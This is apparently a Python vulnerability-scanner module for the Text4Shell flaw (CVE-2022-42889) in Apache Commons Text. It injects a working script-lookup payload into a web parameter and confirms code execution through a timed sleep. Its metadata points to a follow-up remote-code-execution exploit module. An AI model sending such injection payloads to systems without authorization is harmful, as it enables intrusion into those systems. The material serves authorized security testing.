#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Commons Text CVE-2022-42889 (Text4Shell) detection."""

import random
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Commons Text CVE-2022-42889 Detection',
        'description': (
            'Detects CVE-2022-42889 (Text4Shell) via a blind sleep injection '
            'using the script:javascript StringSubstitutor lookup on a target parameter.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2022', 'text4shell', 'commons-text',
            'java', 'rce', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 1,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {'param': 'param'},
                'suggested_followups': [
                    'exploits/multi/http/apache_commons_text4shell_cve_2022_42889_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-42889',
            'https://sysdig.com/blog/cve-2022-42889-text4shell/',
        ],
        'cve': 'CVE-2022-42889',
    }

    param = OptString('search', 'Parameter to test for Text4Shell', True)
    http_method = OptChoice(
        'GET',
        'HTTP method',
        False,
        choices=['GET', 'POST'],
        advanced=True,
    )

    def run(self):
        param = str(self.param or 'search').strip()
        sleep_secs = random.randint(4, 7)
        payload = f'${{script:javascript:java.lang.Thread.sleep({sleep_secs * 1000})}}'
        method = str(self.http_method or 'GET').strip().upper()
        path = str(self.path or '/')
        if not path.startswith('/'):
            path = '/' + path

        start = time.monotonic()
        if method == 'POST':
            r = self.http_request(
                method='POST',
                path=path,
                data={param: payload},
                allow_redirects=False,
            )
        else:
            r = self.http_request(
                method='GET',
                path=path,
                params={param: payload},
                allow_redirects=False,
            )
        elapsed = time.monotonic() - start
        if not r:
            return False
        if elapsed < (sleep_secs - 0.5):
            return False

        self.set_info(
            severity='critical',
            reason=f'Text4Shell sleep probe confirmed on parameter {param!r}',
            path=path,
            evidence=f'sleep={sleep_secs}s elapsed={elapsed:.1f}s',
        )
        return True
